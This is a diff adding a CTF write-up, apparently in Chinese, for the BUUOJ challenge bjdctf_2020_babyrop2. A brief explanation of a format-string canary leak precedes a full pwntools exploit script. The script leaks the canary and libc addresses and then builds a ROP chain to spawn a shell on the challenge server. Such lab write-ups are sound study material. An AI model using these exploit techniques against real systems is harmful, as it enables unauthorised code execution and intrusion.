@@ -780,3 +780,70 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+### bjdctf_2020_babyrop2
+
+[题目链接](https://buuoj.cn/challenges#bjdctf_2020_babyrop2)
+
+开了 canary 保护，但是 fmt 漏洞。
+
+<img width="2556" height="918" alt="image" src="https://github.com/user-attachments/assets/b8aec103-b451-457b-b178-a00dfdb64bac" />
+
+简单扫一下，发现偏移是 6，然后第 7 个有点像 canary，gdb 一下发现就是。
+
+<img width="1899" height="1049" alt="f0c1d1c8bbbae9e679e199c2afd1d17b" src="https://github.com/user-attachments/assets/c7b3232a-8f05-47f1-9688-97cc81964716" />
+
+然后直接 ret2libc。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 27342
+io = remote(host,port)
+# io = process("./bjdctf_2020_babyrop2")
+elf = ELF("./bjdctf_2020_babyrop2")
+libc = ELF("./libc-2.23.so")
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main_addr = elf.sym['main']
+pop_rdi_ret = 0x400993
+ret = 0x400994
+
+def main():
+    io.recvuntil(b"I'll give u some gift to help u!\n")
+    payload_1 = b"AA%7$p"   # 7 11
+    io.send(payload_1)
+    io.recvuntil(b"AA")
+    leak_data = io.recvline().strip(b'\n')
+    leak_canary = int(leak_data,16)
+    print("\n[+] Leak Canary:",hex(leak_canary))
+    io.recvuntil(b"Pull up your sword and tell me u story!\n")
+    payload_2 = b'A'*0x18 + p64(leak_canary) + b"B"*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+    # payload_2 = b'A'*8 + b'B'*8 + b'C'*8
+    # gdb.attach(io,"b *0x4008D8\n c")
+    # pause()
+    io.send(payload_2)
+    leak_data = io.recvline().strip(b'\n')
+    leak_data = leak_data.ljust(8,b'\x00')
+    puts_addr = u64(leak_data)
+    print("\n[+] Leak puts:",hex(puts_addr))
+    libc_base = puts_addr - libc.sym['puts']
+    system = libc_base + libc.sym['system']
+    binsh = libc_base + next(libc.search(b'/bin/sh'))
+    print("\n[+] Leak libc base:",hex(libc_base))
+    print("\n[+] Leak system:",hex(system))
+    print("\n[+] Leak binsh:",hex(binsh))
+    io.recvuntil(b"I'll give u some gift to help u!\n")
+    io.send(payload_1)
+    io.recvuntil(b"Pull up your sword and tell me u story!\n")
+    payload_3 = b'A'*0x18 + p64(leak_canary) + b"B"*8 + p64(ret) +  p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(0)
+    io.sendline(payload_3)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
